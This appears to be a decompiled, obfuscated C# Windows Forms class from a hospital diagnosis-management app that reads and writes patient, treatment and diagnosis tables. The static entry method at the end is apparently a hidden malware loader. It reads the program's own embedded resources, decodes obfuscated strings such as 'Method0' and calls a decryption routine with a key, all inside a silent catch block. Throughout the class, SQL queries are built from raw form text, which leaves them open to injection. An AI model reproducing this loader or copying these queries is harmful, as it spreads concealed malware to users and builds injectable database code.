using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Windows.Forms;
using Ba95Nn;
using Cp6r3F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Ne12Qa;
using Qe84;
using b1D6So;

namespace o6FHd3;

public class e1TFq0
{
	[StructLayout(LayoutKind.Auto)]
	internal struct Hc4m6Q
	{
		internal SqlConnection V;

		internal object o;

		internal object y;

		internal object P;

		internal object L;

		internal object S;

		internal object R;

		internal object B;

		internal object w;

		internal object k;

		internal object J;

		internal object X;

		internal object f;
	}

	internal sealed class y3RMn1
	{
		internal SqlConnection V;

		internal object M;

		internal object G;

		internal object X;

		internal object d;

		internal y3RMn1()
		{
		}
	}

	private object w;

	private object L;

	private object I;

	private object m_b;

	private object R;

	private y3RMn1 Q = new y3RMn1();

	public object K
	{
		get
		{
			return Q.G;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			Q.G = objectValue;
		}
	}

	public object F
	{
		get
		{
			return this.m_b;
		}
		set
		{
			this.m_b = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object b
	{
		get
		{
			return Q.X;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			Q.X = objectValue;
		}
	}

	public object n
	{
		get
		{
			return R;
		}
		set
		{
			R = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object J
	{
		get
		{
			return Q.d;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			Q.d = objectValue;
		}
	}

	public e1TFq0()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		ICloneable cloneable = (ICloneable)new SqlConnection("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=A:\\Ritik Dev\\HospitalDB\\HospitalDB.mdf;Integrated Security=True;Connect Timeout=30");
		Q.V = (SqlConnection)((cloneable is SqlConnection) ? cloneable : null);
	}

	private void An59Qm()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		Q.V.Open();
		ICloneable cloneable = (ICloneable)new SqlCommand("Select * From PatientTb", Q.V);
		IDataAdapter dataAdapter = (IDataAdapter)new SqlDataAdapter((SqlCommand)cloneable);
		ISupportInitialize supportInitialize = new DataTable();
		((DbDataAdapter)((dataAdapter is SqlDataAdapter) ? dataAdapter : null)).Fill((DataTable)supportInitialize);
		NewLateBinding.LateSetComplex(K, (Type)null, "DataSource", new object[1] { (DataTable)supportInitialize }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(K, (Type)null, "DisplayMember", new object[1] { "PatientId" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(K, (Type)null, "ValueMember", new object[1] { "PatientId" }, (string[])null, (Type[])null, false, true);
		Q.V.Close();
	}

	public void Yb7d3Z()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		Q.V.Open();
		IConvertible convertible = "select * from DiagnosisTb";
		ICloneable cloneable = (ICloneable)new SqlDataAdapter(convertible as string, Q.V);
		ISerializable serializable = new DataSet();
		((DbDataAdapter)((cloneable is SqlDataAdapter) ? cloneable : null)).Fill((DataSet)serializable);
		NewLateBinding.LateSetComplex(F, (Type)null, "DataSource", new object[1] { (serializable as DataSet).Tables[0] }, (string[])null, (Type[])null, false, true);
		Q.V.Close();
	}

	private void Hp5j4Y()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		Q.V.Open();
		DbCommand dbCommand = (DbCommand)new SqlCommand("Select * From TreatmentTb", Q.V);
		ICloneable cloneable = (ICloneable)new SqlDataAdapter((SqlCommand)dbCommand);
		object obj = new DataTable();
		((DbDataAdapter)(SqlDataAdapter)cloneable).Fill((DataTable)obj);
		NewLateBinding.LateSetComplex(b, (Type)null, "DataSource", new object[1] { obj as DataTable }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(b, (Type)null, "DisplayMember", new object[1] { "TreatDesc" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(b, (Type)null, "ValueMember", new object[1] { "TreatDesc" }, (string[])null, (Type[])null, false, true);
		Q.V.Close();
	}

	private void p0W9Kd(object sender, EventArgs e)
	{
		An59Qm();
		Hp5j4Y();
		Yb7d3Z();
	}

	private void r2R7Mg(object sender, EventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		Q.V.Open();
		IComparable comparable = "Select * from PatientTb where PatientId = '" + NewLateBinding.LateGet(K, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "'";
		object obj = (object)new SqlCommand((string)comparable, Q.V);
		new DataTable();
		DbDataReader dbDataReader = (DbDataReader)(object)((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteReader();
		while (((SqlDataReader)((dbDataReader is SqlDataReader) ? dbDataReader : null)).Read())
		{
			NewLateBinding.LateSetComplex(n, (Type)null, "Text", new object[1] { ((SqlDataReader)dbDataReader).get_Item(1) }, (string[])null, (Type[])null, false, true);
		}
		Q.V.Close();
	}

	private void a5DLw7(object sender, EventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		Q.V.Open();
		IEnumerable enumerable = "Select * from TreatmentTb where TreatDesc = '" + NewLateBinding.LateGet(b, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "'";
		ICloneable cloneable = (ICloneable)new SqlCommand((string)enumerable, Q.V);
		new DataTable();
		DbDataReader dbDataReader = (DbDataReader)(object)((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteReader();
		while (((SqlDataReader)((dbDataReader is SqlDataReader) ? dbDataReader : null)).Read())
		{
			NewLateBinding.LateSetComplex(J, (Type)null, "Text", new object[1] { ((SqlDataReader)((dbDataReader is SqlDataReader) ? dbDataReader : null)).get_Item(2) }, (string[])null, (Type[])null, false, true);
		}
		Q.V.Close();
	}

	internal void g0DJf5()
	{
		throw new NotImplementedException();
	}

	private void j8P1Rc(object sender, EventArgs e)
	{
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Expected O, but got Unknown
		//IL_019c: Unknown result type (might be due to invalid IL or missing references)
		Q.V.Open();
		IEquatable<string> equatable = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" insert into DiagnosisTb values(", NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)","), (object)NewLateBinding.LateGet(K, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)",'"), NewLateBinding.LateGet(n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(Q.M, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(L, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(I, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(b, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"',"), NewLateBinding.LateGet(J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)")"));
		DbCommand dbCommand = (DbCommand)new SqlCommand(equatable as string, Q.V);
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Diagnosis Successfully Added", (MsgBoxStyle)0, (object)null);
		Q.V.Close();
		Yb7d3Z();
	}

	private void Xe4j9F(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Unknown result type (might be due to invalid IL or missing references)
		//IL_023e: Expected O, but got Unknown
		//IL_023f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0251: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(Q.M, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(L, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(I, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
		{
			Interaction.MsgBox((object)"Incomplete Information", (MsgBoxStyle)0, (object)null);
			return;
		}
		Q.V.Open();
		object obj = (object)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Update DiagnosisTb set PatId ='" + NewLateBinding.LateGet(K, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "', PatName='"), NewLateBinding.LateGet(n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Symptoms='"), NewLateBinding.LateGet(Q.M, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Medicines='"), NewLateBinding.LateGet(L, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Diagnosis='"), NewLateBinding.LateGet(I, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Treatment ='"), (object)NewLateBinding.LateGet(b, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"', Cost ='"), NewLateBinding.LateGet(J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' Where DiagID = "), NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"")), Q.V);
		((SqlCommand)obj).ExecuteNonQuery();
		Interaction.MsgBox((object)"Receptionist Updated Successfully", (MsgBoxStyle)0, (object)null);
		Q.V.Close();
		Yb7d3Z();
	}

	private void Xn56Bf(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			Interaction.MsgBox((object)"Enter The Diagnosis ID", (MsgBoxStyle)0, (object)null);
			return;
		}
		Q.V.Open();
		object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Delete from DiagnosisTb where DiagID=", NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)""));
		ICloneable cloneable = (ICloneable)new SqlCommand((string)obj, Q.V);
		((SqlCommand)cloneable).ExecuteNonQuery();
		Interaction.MsgBox((object)"Diagnosis Delete", (MsgBoxStyle)0, (object)null);
		Q.V.Close();
		Yb7d3Z();
	}

	private void y6R1Zr(object sender, EventArgs e)
	{
		object obj = new x6WSe8();
		(obj as x6WSe8).c7Q4Sk();
	}

	private void Wd14Qs(object sender, EventArgs e)
	{
		object obj = new Jy71To();
		((Jy71To)obj).Df8b9W();
	}

	private void c1MYw5(object sender, EventArgs e)
	{
		object obj = new p1HNe2();
		(obj as p1HNe2).e4R9Af();
	}

	private void Ex71Nb(object sender, EventArgs e)
	{
		object obj = new n6R9Wx();
		(obj as n6R9Wx).c7W6Hx();
	}

	private void Rp95Ak(object sender, DataGridViewCellEventArgs e)
	{
	}

	[STAThread]
	public static void t0QSf2()
	{
		try
		{
			object obj;
			int k;
			do
			{
				obj = new Jy71To.g6BLq5();
				((Jy71To.g6BLq5)obj).K = p1HNe2.w9HTb3();
				k = ((Jy71To.g6BLq5)obj).K;
			}
			while (k != 100);
			((Jy71To.g6BLq5)obj).T = Assembly.LoadFile(Application.get_ExecutablePath());
			(obj as Jy71To.g6BLq5).T = (string[])NewLateBinding.LateGet(((Jy71To.g6BLq5)obj).T, (Type)null, "GetManifestResourceNames", new object[0], (string[])null, (Type[])null, (bool[])null);
			(obj as Jy71To.g6BLq5).d = "AsadZx";
			((Jy71To.g6BLq5)obj).I = ".reso" + "urc" + "es";
			((Jy71To.g6BLq5)obj).o = "aaMaeatahaoada0a";
			((Jy71To.g6BLq5)obj).F = 35;
			(obj as Jy71To.g6BLq5).b = 0;
			object obj2 = new List<int>
			{
				Capacity = 15
			};
			int num = 0;
			do
			{
				((List<int>)obj2).Add((obj as Jy71To.g6BLq5).K % checked(num + 2));
				num = checked(num + 1);
			}
			while (num <= 10);
			if ((obj2 as List<int>)[5] == 2)
			{
				Kx43.Ap3y((Jy71To.g6BLq5)obj, (obj2 as List<int>)[7], "SdVbcskldfjp", bool_0: false);
				if (((List<int>)obj2)[5] > 0)
				{
					((List<int>)obj2)[5] = checked(((List<int>)obj2)[5] * 25 * 25);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
